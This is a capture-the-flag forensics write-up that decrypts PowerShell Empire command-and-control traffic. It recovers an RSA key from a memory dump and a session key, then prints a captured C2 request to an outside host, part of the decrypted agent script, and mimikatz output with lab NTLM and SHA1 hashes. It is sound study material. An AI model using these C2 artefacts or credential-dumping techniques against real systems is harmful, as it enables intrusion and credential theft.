enc_data = "8e15a81b0cb93c54dd4cbf8cf105cd5727b1d0c7af9c952546a5c05324617d21d468b464582ed8f156fbeb3b0d3a377e1416aeb21d8c013830141e4383f4bf4855ba5eb156f0aeefda62883d646a0a446a16bc94ddd7780cca739cc5c28dd7caf3783822060555c4f0d0f5e0f9044ad2ce452addde11c335489611c588f0e47347273e23e29d4fd956fd3846b57d62027774b33a9d963d55e00dcc018f95400d25852db856f0be9bf3816c94ea12ab9aa8db5217e20352995025b81dbaa23c2f253804bdcd48e4662cd5f035112de674d2572a70958c2a96c1a06bd767b933841d4204dd6558314f7ded14fb9633919afaf1fa214ac95e6ccfa053b749fc61be80c8e2e2bc416dc5c6af88fa44552b12a3f6e138c10cbccaacc5df76eb282961b2696876b312c6bff0da82e81c9694776481a47b923a26e62f5486e09878595ff7480677124fedd7404e9fb15d769cacc64dfbbbb1c527e6ef7ce1166a39ffc015ec9a3f6e88ed47e30e729f290787fa424ef98c50705c31216b9e5d9723a11eeeccc76325ce32b1b5f6b5fb1deb1861544f7484607d2ecdf25abad79d1900d8cab257e1b7290ce5dbc7211d45c547c3f0972ba228daddd6728aba0b36a70bdbc2cd95a3f56b2efd5e684042a721"

encr_data = bytes.fromhex(enc_data)

decrypted_text = aes_decrypt(encr_data[20:], key)
print("[+] AES Decrypted:", decrypted_text)
```

Running it, we get:  
```py
└─$ python rc4_decrypt.py
[+] AES Decrypted: b'<RSAKeyValue><Modulus>xzZdhYfhAmxwd+qFhfLfXuIAJsQeE5tVsFO0zKXbnwytKA+1wkZIGpO6QsTuJ3FAeTdOJjbypnBBDtuuPj/VfHl62Odn95LemkFqKLig13zaGLWd9Cn26ZyobbMfavrySKT+jFgNPaCYpvVLOyAeHZJa1/sGr0E/AdUGhG1l5tWmlm4Kl4Qe5yXp/ySpFflA0W/AzYVtVndm5tiC5GTGuy3Nes+Wedl0wMM9cMrVGusyawdre2B5VtjuuAFSUKlbEoSyxBhCDpJ0t+wHidBnRZzu9nS6J9wWYr/iT6xufZELpSGw56oIQGwp1mTcAjCQ7urtp6lvRJ7nm+Gat38JTQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>\x01\x00\xe4\x9ct\xb3\x0e\xd0\xd8o\xddJ82_\xe8<'
```
We are met with an RSA public key. The article indicates that in the STAGE 1 traffic, an RSA PEM was sent in the request and the response was encrypted with the RSA private key. The article suggests that using the RSA public key we could decrypt the response, something that I did not manage to do. Now what?  

## Stage 1 - Extracting RSA PrivKey from minidump

Recall that along with the pcap file, we were given a powershell minidump of the victims machine. I also recalled a similar challenge from HTB were you had to extract a key from a powershell minidump to decrypt traffic, so i thought this might be the case. I tried a bunch of tools and I got lucky with the following tool:  
- https://github.com/naacbin/CovenantDecryptor/blob/main/extract_privatekey.py

This repository also has a script to decrypt the whole traffic, but there is no fun in that!  
So what I did was to convert to a number the base64 modulus N from the public key and use that with the tool to get the factors `p` and `q`. But truth is, I don't even need to get the factors separately to recreate the private key - the tool takes care of that providing a final privkey.pem file.  
```py
└─$ python extract_private_key.py -i powershell.DMP -m 25148231226098036568609085786032493445047970858838750757353784046851780996252815164646595354657712347303902433050994584748229413761156337576101444810190533703870848976912366148228482653348855081349089844894215870541245746763769526279157470729874284392842948681388833599108264376759680056204274109786502052449471112587419970215023968989031953153074974224971309706651080504728448055280751647021310124504423016412562368406349427252523767629273098705526800196895955775193783311406083938956019398407824378637691235681260892457410354167254736588107208133326588940908108092201039005698412773934207300784362999497054207543629 -o ./
[-] A pair of P and Q were located, but they do not match the modulus.
[-] A pair of P and Q were located, but they do not match the modulus.
[-] A pair of P and Q were located, but they do not match the modulus.
p = 
150956452089032925291860870726198111603099541025300342333620399744356915258819492908817503860740117387753537741614261518421211406637997667084060302456525289568916888709137393722618808502204768902619690472878363471641168599211223
012394804175169720239746303980466444986602638061450001494265915151494105179625839
q = 
166592622429055288486164345109844143518609430500796394935657230876873251019149580311937449492539553993684365940867416075970157500630000590374888054804987267317822674555104708403999018304929733771124856592150400779922363207718221
865544295510633783738240215332006595869963087595654764820798172520369633815204611
[+] Saved private key /home/connar/Downloads/empireAtRisk/privkey1.pem
```

## Stage 1 - RSA decryption to get Empire's nonce and SessionKey

Now that we have the private key, let's try and decrypt the response bytes with it. I tried extracting the `d` value to manually decrypt, but then reading through the [docs](https://pycryptodome-master.readthedocs.io/en/latest/src/cipher/pkcs1_v1_5.html#pkcs-1-v1-5-encryption-rsa) of how to use the .pem key itself for decryption, i got a more clean result:  
```py
from Crypto import Random
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

encr = bytes.fromhex("7b9d30638cc89a527ed9e5608c5ee485d157f62fc1b7efc4d8858c16a0981f9b54321f6b841b665a414948b0eec1d3a706d5210636ca2b17ee24291a1d3eaa6045ccf3e7cfd3b6b14f43eda80c430b3daae82073119906896b312b8925e668b3cff27f67e603a36144b7647de7a6841f55c3a6b89ecc0ac4d3a5596b66b7e96e546657cf67d3e6457a5290babf190d9caea03a5603ce8dea7d4bad7d79b04e6845b1760c8272f3d1b6d930e0d643defc48050e7350e53995566ff2e66994627cc553002efea8bb3f0f7326b942587633c2b7c85f50c2e7d6a91ef29e985e38191968fcda843332972f87586413ad2a840bd601b77b817e91d0378d63e52b9c98")


f = open('privkey1.pem','r')
key = RSA.importKey(f.read())
cipher = PKCS1_v1_5.new(key)
sentinel = Random.new().read(16)
decrypted = cipher.decrypt(encr, sentinel)

print(f"nonce: {decrypted[:16]}\nSessionKey: {decrypted[16:]}")
```
Running it, we get the nonce and the SessionKey:
```
└─$ python rsa_privkey_decrypt.py
nonce: b'6486863263721433'
SessionKey: b'd%~gc_:vhZP+.VHWsolQEz1}ICKma;D@'
```
And we got two values that look promising - promising in the sense that they look like values that the post was showcasing. These values according to the post, will now be used to decrypt the rest of the packets with AES.CBC with the `nonce` as the `IV` and the `SessionKey` as the new `Key`. We are now ready to proceed to STAGE 2!

# Stage 2 - Decrypting rest of the packets

We move to the third Request - Response pair where we will try to decrypt the first 20 bytes again to verify we are at the third stage (STAGE 2):  
```
POST /admin/get.php HTTP/1.1
Cookie: RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=
Hop-Name: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: 77.74.198.52:8083
Content-Length: 222

......%Dg..D.&..ua..`V..6.&T....>.:)M{. ."yw..vg}.y..D...q.}Zr..z.
h>.8s@..4...>.P.[.....q...Q....h.......T..
.KI@.

.(C.b.v......YF{:..O.....|(.B..O...,,s.P],h....%.`vTk..|:.L...Z..,..y56.K...G.........o..... .|.......:..HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.9.13
Date: Tue, 30 Aug 2022 16:35:52 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 41402
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Server: Microsoft-IIS/7.5
Connection: close

.hE
.e..1....".F.......$C.Lu....!Z.<7...f..bV..)...@..7........q(	S.Dy.{....%ROX.F.L/.?....$J..4.s.z[.....V...a....t..4.;R. .....L.."D.g.z....._p[..s..............>.@{.^.x....tP..|...%..M..tr/V9,.q....|~#w..hk*.wfd..X...pb..W"......Z"...r>DJ.......t/(&MJ..U....nQ.....$.s.(j.;...............<....V.....1...E.......Lu...!...+3.J.0r.....8t..X]..;.....^.....<.|....g3=..1...V.Y.Qj...g......v2l(.t.a.!s..s... ..7
.R...P......D.hp...FE......p..4.[..O~.B..'...L.....:.@8...z....M.......c...B.>..x.x........,.sGCl.i?^...|7.^%..g...[PXhc
..i.]-0.!7<.....q....k..RX..B.C..x.QNz9.3...!,]..U..N.Q0f..'.!&.r.}U...&.Q.=..Mm...a...g.................ZV...........SLZ
...d....8e.+_.......7..&.P.....k"..._..
.jk.
;.:.....o.R.K#.C..m)...^J..$...r5,M
u.i..DRd....... .....}.A...u}....Miw..S..(..P...G@d.@.D.....Ty.ve.....qF.....r......=.9........%.y.f(..........
p).......I.,Ft..>.m.GK..'...m..*..P..."...b".#q --more bytes--
```
Running our previous `rc4-decrypt.py` script, we indeed get the feedback that we are in the final stage:  
```py
└─$ python rc4_decrypt.py        
[+] RC4 Decrypted: b'EBXWPAHZ\x01\x03\x00\x00\xca\x00\x00'
```

We will now get the response bytes and decrypt them using `AES.CBC` with the `nonce` and `SessionKey` we previously found. Using a previous script I made for the AES.CBC decryption - now updated with the new values, we end up with:  
```py
from Crypto.Cipher import  AES
from Crypto.Util.Padding import pad, unpad

def aes_decrypt(ciphertext, key):
    ciphertext = pad(ciphertext, AES.block_size)
    iv = b'6486863263721433'
    cipher = AES.new(key, AES.MODE_CBC, iv)

    plaintext = cipher.decrypt(ciphertext[16:])

    return plaintext

key = b'd%~gc_:vhZP+.VHWsolQEz1}ICKma;D@'
enc_data = "1368450d8e65198d31b9e1bba522cb4611f9d89 --rest of response bytes--"

encr_data = bytes.fromhex(enc_data)

decrypted_text = aes_decrypt(encr_data, key)
print("[+] AES Decrypted:", decrypted_text)
```
Running it, we get:
```ps1
└─$ python aes_decrypt.py 
[+] AES Decrypted: b'C)\x13X\xc2:E\xd1\'\xc6\x84\xcf\xc0!\xd8\x0e\n    param(\n        [Parameter(Mandatory=$true)]\n        [String]\n        $StagingKey,\n        [Parameter(Mandatory=$true)]\n        [String]\n        $SessionKey,\n        [Parameter(Mandatory=$true)]\n        [String]\n        $SessionID,\n        [Int32]\n        $AgentDelay = 5,\n        [Double]\n        $AgentJitter = 0.0,\n        [String[]]\n        $Servers,\n        [String]\n        $KillDate,\n        [Int32]\n        $KillDays,\n        [String]\n        $WorkingHours,\n        [object]\n        $ProxySettings,\n        [String]\n        $Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",\n        [Int32]\n        $LostLimit = 60,\n        [String]\n        $DefaultResponse = "PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxoZWFkPgogICAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIvPgogICAgPHRpdGxlPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG5vdCBmb3VuZC48L3RpdGxlPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KPCEtLQpib2R5e21hcmdpbjowO2ZvbnQtc2l6ZTouN2VtO2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7YmFja2dyb3VuZDojRUVFRUVFO30KZmllbGRzZXR7cGFkZGluZzowIDE1cHggMTBweCAxNXB4O30gCmgxe2ZvbnQtc2l6ZToyLjRlbTttYXJnaW46MDtjb2xvcjojRkZGO30KaDJ7Zm9udC1zaXplOjEuN2VtO21hcmdpbjowO2NvbG9yOiNDQzAwMDA7fSAKaDN7Zm9udC1zaXplOjEuMmVtO21hcmdpbjoxMHB4IDAgMCAwO2NvbG9yOiMwMDAwMDA7fSAKI2hlYWRlcnt3aWR0aDo5NiU7bWFyZ2luOjAgMCAwIDA7cGFkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ0cmVidWNoZXQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkY7CmJhY2tncm91bmQtY29sb3I6IzU1NTU1NTt9CiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmdpbi10b3A6OHB4O3BhZGRpbmc6MTBweDtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci0tPgogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGRpdiBpZD0iaGVhZGVyIj48aDE+U2VydmVyIEVycm9yPC9oMT48L2Rpdj4KPGRpdiBpZD0iY29udGVudCI+CiAgICA8ZGl2IGNsYXNzPSJjb250ZW50LWNvbnRhaW5lciI+CiAgICAgICAgPGZpZWxkc2V0PgogICAgICAgICAgICA8aDI+NDA0IC0gRmlsZSBvciBkaXJlY3Rvcnkgbm90IGZvdW5kLjwvaDI+CiAgICAgICAgICAgIDxoMz5UaGUgcmVzb3VyY2UgeW91IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtb3ZlZCwgaGFkIGl0cyBuYW1lIGNoYW5nZWQsIG9yIGlzIHRlbXBvcmFyaWx5CiAgICAgICAgICAgICAgICB1bmF2YWlsYWJsZS48L2gzPgogICAgICAgIDwvZmllbGRzZXQ+CiAgICA8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg=="\n    )\n    $Encoding = [System.Text.Encoding]::ASCII\n    $HMAC = New-Object System.Security.Cryptography.HMACSHA256\n    $script:AgentDelay = $AgentDelay\n    $script:AgentJitter = $AgentJitter\n    $script:LostLimit = $LostLimit\n    $script:MissedCheckins = 0\n    $script:ResultIDs = @{}\n    $script:WorkingHours  -- a lot more --
```

Although no flag can be seen in the decrypted data, we now have the `IV` and `Key` to decrypt all the other packets. There was one HTTP packet that had a huge size so I thought of trying decrypting that. I had some difficulties at first, but eventually modified my decryption to decrypt from the 20th byte onwards and it worked:
```py
# key is the SessionKey we found
def aes_decrypt(ciphertext, key):
    ciphertext = pad(ciphertext, AES.block_size)
    iv = b'6486863263721433'
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # first 20 bytes are metadata encrypted with the RC4 key. Last 10 are HMAC SHA 256 verification data
    plaintext = cipher.decrypt(pad(ciphertext[20:], AES.block_size))

    return plaintext
```

Running it, we get:
```py
─$ python aes_decrypt.py
[+] AES Decrypted: b'|It\xbdK\x96\xaaW_\xd0G)\x93\xa8\x0f\xddn\x00\x01\x00\x01\x00\x07\x00\xac&\x00\x00SG9zdG5hbWU6IHNhdGVsbGl0ZS0yMzQxLkNPUlAubG9jYWwgLyBTLTEtNS0yMS0yODg2NDAyNDAtNDE0MzE2MDc3NC00MTkzNDc4MDExDQoKICAuIyMjIyMuICAgbWltaWthdHogMi4yLjAgKHg2NCkgIzE5MDQxIE5vdiAyMCAyMDIxIDA4OjI4OjA2CiAuIyMgXiAjIy4gICJBIExhIFZpZSwgQSBMJ0Ftb3VyIiAtIChvZS5lbykKICMjIC8gXCAjIyAgLyoqKiBCZW5qYW1pbiBERUxQWSBgZ2VudGlsa2l3aWAgKCBiZW5qYW1pbkBnZW50aWxraXdpLmNvbSApCiAjIyBcIC8gIyMgICAgICAgPiBodHRwczovL2Jsb2cuZ2VudGlsa2l3aS5jb20vbWltaWthdHoKICcjIyB2ICMjJyAgICAgICBWaW5jZW50IExFIFRPVVggICAgICAgICAgICAgKCB2aW5jZW50LmxldG91eEBnbWFpbC5jb20gKQogICcjIyMjIycgICAgICAgID4gaHR0cHM6Ly9waW5nY2FzdGxlLmNvbSAvIGh0dHBzOi8vbXlzbWFydGxvZ29uLmNvbSAqKiovCgptaW1pa2F0eihwb3dlcnNoZWxsKSAjIHNla3VybHNhOjpsb2dvbnBhc3N3b3JkcwoKQXV0aGVudGljYXRpb24gSWQgOiAwIDsgMzMyNTUwICgwMDAwMDAwMDowMDA1MTMwNikKU2Vzc2lvbiAgICAgICAgICAgOiBJbnRlcmFjdGl2ZSBmcm9tIDEKVXNlciBOYW1lICAgICAgICAgOiBTYXRBZG1pbmlzdHJhdG9yCkRvbWFpbiAgICAgICAgICAgIDogQ09SUApMb2dvbiBTZXJ2ZXIgICAgICA6IENPUlAtREMKTG9nb24gVGltZSAgICAgICAgOiA4LzMwLzIwMjIgMTI6MzM6MzAgUE0KU0lEICAgICAgICAgICAgICAgOiBTLTEtNS0yMS0yODg2NDAyNDAtNDE0MzE2MDc3NC00MTkzNDc4MDExLTExMTQKCW1zdiA6CQoJIFswMDAwMDAwM10gUHJpbWFyeQoJICogVXNlcm5hbWUgOiBTYXRBZG1pbmlzdHJhdG9yCgkgKiBEb21haW4gICA6IENPUlAKCSAqIE5UTE0gICAgIDogYTlmZGZhMDM4YzRiNzVlYmM3NmRjODU1ZGQ3NGYwZGEKCSAqIFNIQTEgICAgIDogOTQwMGFlMjg0NDhlMTM2NDE3NGRkZTI2OWIyY2NlMWJjYTlkN2VlOAoJICogRFBBUEkgICAgOiBmZDExYWQzZGM0MzMzMTkwMTA5YzE1ZGI5MzFhM2I0YQoJdHNwa2cgOgkKCXdkaWdlc3QgOgkKCSAqIFVzZXJuYW1lIDogU2F0QWRtaW5pc3RyYXRvcgoJICogRG9tYWluICAgOiBDT1JQCgkgKiBQYXNzd29yZCA6IChudWxsKQoJa2VyYmVyb3MgOgkKCSAqIFVzZXJuYW1lIDogU2F0QWRtaW5pc3RyYXRvcgoJICogRG9tYWluICAgOiBDT1JQLkxPQ0FMCgkgKiBQYXNzd29yZCA6IChudWxsKQoJc3NwIDoJCgljcmVkbWFuIDoJCgkgWzAwMDAwMDAwXQoJICogVXNlcm5hbWUgOiBBZG1pbmlzdHJhdG9yCgkgKiBEb21haW4gICA6IGNvcnAtZGMKCSAqIFBhc3N3b3JkIDogSFRCe3RoM18zbXAxcjNfRjFuNGxseV9DMGxsNHBzM2R9CgljbG91ZGFwIDoJCgpBdXRoZW50aWNhdGlvbiBJZCA6IDAgOyAzMzI1MTggKDAwMDAwMDAwOjAwMDUxMmU2KQpTZXNzaW9uICAgICAgICAgICA6IEludGVyYWN0aXZlIGZyb20gMQpVc2VyIE5hbWUgICAgICAgICA6IFNhdEFkbWluaXN0cmF0b3IKRG9tYWluICAgICAgICAgICAgOiBDT1JQCkxvZ29uIFNlcnZlciAgICAgIDogQ09SUC1EQwpMb2dvbiBUaW1lICAgICAgICA6IDgvMzAvMjAyMiAxMjozMzozMCBQTQpTSUQgICAgICAgICAgICAgICA6IFMtMS01LTIxLTI4ODY0MDI0MC00MTQzMTYwNzc0LTQxOTM0NzgwMTEtMTExNAoJbXN2IDoJCgkgWzAwMDAwMDAzXSBQcmltYXJ5CgkgKiBVc2VybmFtZSA6IFNhdEFkbWluaXN0cmF0b3IKCSAqIERvbWFpbiAgIDogQ09SUAoJICogTlRMTSAgICAgOiBhOWZkZmEwMzhjNGI3NWViYzc2ZGM4NTVkZDc0ZjBkYQoJICogU0hBMSAgICAgOiA5NDAwYWUyODQ0OGUxMzY0MTc0ZGRlMjY5YjJjY2UxYmNhOWQ3ZWU4CgkgKiBEUEFQSSAgICA6IGZkMTFhZDNkYzQzMzMxOTAxMDljMTVkYjkzMWEzYjRhCgl0c3BrZyA6CQoJd2RpZ2VzdCA6CQoJICogVXNlcm5hbWUgOiBTYXRBZG1pbmlzdHJhdG9yCgkgKiBEb21haW4gICA6IENPUlAKCSAqIFBhc3N3b3JkIDogKG51bGwpCglrZXJiZXJvcyA6CQoJICogVXNlcm5hbWUgOiBTYXRBZG1pbmlzdHJhdG9yCgkgKiBEb21haW4gICA6IENPUlAuTE9DQUwKCSAqIFBhc3N3b3JkIDogKG51bGwpCglzc3AgOgkKCWNyZWRtYW4gOgkKCSBbMDAwMDAwMDBdCgkgKiBVc2VybmFtZSA6IEFkbWluaXN0cmF0b3IKCSAqIERvbWFpbiAgIDogY29ycC1kYwoJICogUGFzc3dvcmQgOiBIVEJ7dGgzXzNtcDFyM19GMW40bGx5X0MwbGw0cHMzZH0KCWNsb3VkYXAgOgkKCkF1dGhlbnRpY2F0aW9uIElkIDogMCA7IDk5NyAoMDAwMDAwMDA6MDAwMDAzZTUpClNlc3Npb24gICAgICAgICAgIDogU2VydmljZSBmcm9tIDAKVXNlciBOYW1lICAgICAgICAgOiBMT0NBTCBTRVJWSUNFCkRvbWFpbiAgICAgICAgICAgIDogTlQgQVVUSE9SSVRZCkxvZ29uIFNlcnZlciAgICAgIDogKG51bGwpCkxvZ29uIFRpbWUgICAgICAgIDogOC8zMC8yMDIyIDEyOjMzOjE3IFBNClNJRCAgICAgICAgICAgICAgIDogUy0xLTUtMTkKCW1zdiA6CQoJdHNwa2cgOgkKCXdkaWdlc3QgOgkKCSAqIFVzZXJuYW1lIDogKG51bGwpCgkgKiBEb21haW4gICA6IChudWxsKQoJICogUGFzc3dvcmQgOiAobnVsbCkKCWtlcmJlcm9zIDoJCgkgKiBVc2VybmFtZSA6IChudWxsKQoJICogRG9tYWluICAgOiAob -- more bytes --
```

Decoding the huge b64 blob, we get the flag:
```py
'Hostname: satellite-2341.CORP.local / S-1-5-21-288640240-4143160774-4193478011\r\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Nov 20 2021 08:28:06\n .## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n \'## v ##\'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  \'#####\'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz(powershell) # sekurlsa::logonpasswords\n\nAuthentication Id : 0 ; 332550 (00000000:00051306)\nSession           : Interactive from 1\nUser Name         : SatAdministrator\nDomain            : CORP\nLogon Server      : CORP-DC\nLogon Time        : 8/30/2022 12:33:30 PM\nSID               : S-1-5-21-288640240-4143160774-4193478011-1114\n\tmsv :\t\n\t [00000003] Primary\n\t * Username : SatAdministrator\n\t * Domain   : CORP\n\t * NTLM     : a9fdfa038c4b75ebc76dc855dd74f0da\n\t * SHA1     : 9400ae28448e1364174dde269b2cce1bca9d7ee8\n\t * DPAPI    : fd11ad3dc4333190109c15db931a3b4a\n\ttspkg :\t\n\twdigest :\t\n\t * Username : SatAdministrator\n\t * Domain   : CORP\n\t * Password : (null)\n\tkerberos :\t\n\t * Username : SatAdministrator\n\t * Domain   : CORP.LOCAL\n\t * Password : (null)\n\tssp :\t\n\tcredman :\t\n\t [00000000]\n\t * Username : Administrator\n\t * Domain   : corp-dc\n\t * Password : [REDACTED_FLAG]\n\tcloudap :\t\n'
```

This is it for this training session.